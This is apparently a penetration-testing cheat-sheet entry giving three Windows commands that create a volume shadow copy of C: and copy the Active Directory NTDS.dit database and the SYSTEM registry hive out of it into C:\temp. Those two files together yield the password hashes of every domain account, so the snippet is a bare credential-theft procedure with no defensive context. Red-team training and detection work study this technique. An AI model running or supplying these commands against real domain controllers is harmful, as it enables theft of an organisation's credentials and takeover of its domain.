### Create shadow copy of ntds.dit
```
vssadmin create shadow /for=C:
```

### Copy shadow copy
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy&lt;id&gt;\Windows\NTDS\NTDS.dit C:\temp\&lt;ntds&gt;.dit
```

### Copy system hive
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy&lt;id&gt;\Windows\System32\config\SYSTEM C:\temp\system.hive
```


